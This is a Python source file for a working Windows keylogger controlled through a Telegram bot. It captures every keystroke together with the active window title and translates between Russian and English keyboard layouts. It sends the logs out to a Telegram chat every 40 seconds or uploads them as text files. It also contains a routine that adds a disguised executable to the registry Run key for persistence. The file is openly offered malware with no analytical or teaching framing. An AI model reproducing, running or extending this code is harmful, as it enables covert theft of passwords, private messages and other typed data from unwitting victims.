import os
import urllib.request 														  #check internet connection

import keyboard
from threading import Timer
from datetime import datetime

import ctypes #language
from win32gui import GetWindowText, GetForegroundWindow                               #window info

import telebot
from telebot import types

bot = telebot.TeleBot('Write API Telegram Bot')

SEND_REPORT_EVERY = 40


class Keylogger:

	def __init__(self, report_method, chat_id=None):
		self.chat_id = chat_id
		self.report_method = report_method

		self.interval = SEND_REPORT_EVERY
		self.log = ""
		self.start_dt = datetime.now()
		self.end_dt = datetime.now()
		self.layout = []
		self.windows = ['']

		self.en_keyboard = "~@#$^&QWERTYUIOP{}ASDFGHJKL:\"ZXCVBNM<>?|" + "qwertyuiop[]asdfghjkl;'zxcvbnm,./"
		self.ru_keyboard = "Ё\"№;:?ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮ,/" + "йцукенгшщзхъфывапролджэячсмитьбю."

		self.filenames = []

	def callback(self, event):
		name = event.name
		if len(name) > 1:
			if name == "space":
				name = " "
			elif name == "enter":
				name = "[ENTER]\n"
			elif name == "decimal":
				name = "."
			else:
				name = name.replace(" ", "_")
				name = f"[{name.upper()}]"

		#working with lang on PC
		if len(name) == 1:
			self.layout.append(self.get_layout())

			if len(self.layout) > 2:
				self.layout.pop(-2)

			if len(self.layout) > 1:
				if self.layout[-1] != self.layout[-2] and self.layout[-1] == 'en':
					name = self.en_keyboard[self.ru_keyboard.index(name)]
				elif self.layout[-1] != self.layout[-2] and self.layout[-1] == 'ru':
					name = self.ru_keyboard[self.en_keyboard.index(name)]

		self.windows.append(GetWindowText(GetForegroundWindow()))

		self.log += self.get_window(self.windows) + name

	def get_layout(self):
		user32 = ctypes.WinDLL('user32', use_last_error=True)
		curr_window = user32.GetForegroundWindow()
		thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
		klid = user32.GetKeyboardLayout(thread_id)
		if klid == 68748313:
			return 'ru'
		elif klid == 67699721 or klid == 134809609:
			return 'en'

	def get_window(self, windows: list) -> str:
		if windows[-1] != windows[-2]:
			windows.pop(0)
			return "\n\n{" + windows[-1] + "}\n"
		else:
			windows.pop(0)
			return ''

	def check_internet_connection(self):
		try:
			urllib.request.urlopen('http://google.com', timeout=1)
			return True
		except urllib.error.URLError:
			return False

	def update_filename(self):
		start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
		end_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
		self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

	def report_to_file(self):
		with open(f"{self.filename}.txt", "w") as f:
			print(self.log, file=f)
		print(f"Сохранение {self.filename}.txt")


	def report(self):
		if self.log:
			self.end_dt = datetime.now()
			self.update_filename()

			if self.check_internet_connection():
				if self.report_method == 'telegram':
					self.send_bot(self.log)
				elif self.report_method == 'file':
					self.report_to_file()
					self.send_f_bot(self.filename)

				for filename in self.filenames:
					self.send_f_bot(filename)
				self.filenames = []
			else:
				self.report_to_file()
				self.filenames.append(self.filename)

			self.start_dt = datetime.now()

		self.log = ""
		timer = Timer(interval=self.interval, function=self.report)
		timer.daemon = True
		timer.start()

	def start(self):
		self.start_dt = datetime.now()
		keyboard.on_release(callback=self.callback)
		self.report()
		keyboard.wait()


	# working with bot
	def send_bot(self, message):
		bot.send_message(self.chat_id, message)
	def send_f_bot(self, filename):
		bot.send_document(self.chat_id, open(fr'{filename}.txt', 'rb').read(), visible_file_name=f'{filename}.txt')
		os.remove(filename)


####################################### автозагрузка ##########################################
import winreg as reg
 #######   в пути к файлу надо указывать полный путь до файла, необходимо решить это
def add_to_startup(file_path='C:/Users/Acer/PycharmProjects/Keylogger/output/ActivityControl.exe'):
    key = r"Software\Microsoft\Windows\CurrentVersion\Run"
    try:
        reg_key = reg.HKEY_CURRENT_USER
        #reg_key = reg.HKEY_LOCAL_MACHINE
        reg.CreateKey(reg_key, key)
        registry_key = reg.OpenKey(reg_key, key, 0, reg.KEY_WRITE)
        reg.SetValueEx(registry_key, "MyProgram", 0, reg.REG_SZ, file_path)
        reg.CloseKey(registry_key)
        print("Добавлено успешно в автозагрузку!")
    except Exception as e:
        print(e)

###############################################################################################






@bot.message_handler(commands=['start'])
def start_bot(message):
	#add_to_startup() 																										#автозагрузка
	markup = types.InlineKeyboardMarkup()
	run_bot = types.InlineKeyboardButton(text='Запустить bot', callback_data='start_keylogger_tg')
	run_file = types.InlineKeyboardButton(text='Запустить file', callback_data='start_keylogger_file')
	markup.add(run_bot, run_file)
	bot.send_message(message.chat.id,
					 "Чтобы запустить кейлоггер, выберите куда выводить информацию и нажмите на соответствующую кнопку.",
					 reply_markup=markup)


@bot.callback_query_handler(func=lambda call: True)
def callback_worker(call):
	if call.data == 'start_keylogger_tg':
		keylogger = Keylogger(report_method='telegram', chat_id=call.from_user.id)
		keylogger.start()
	elif call.data == 'start_keylogger_file':
		keylogger = Keylogger(report_method='file', chat_id=call.from_user.id)
		keylogger.start()

bot.polling()


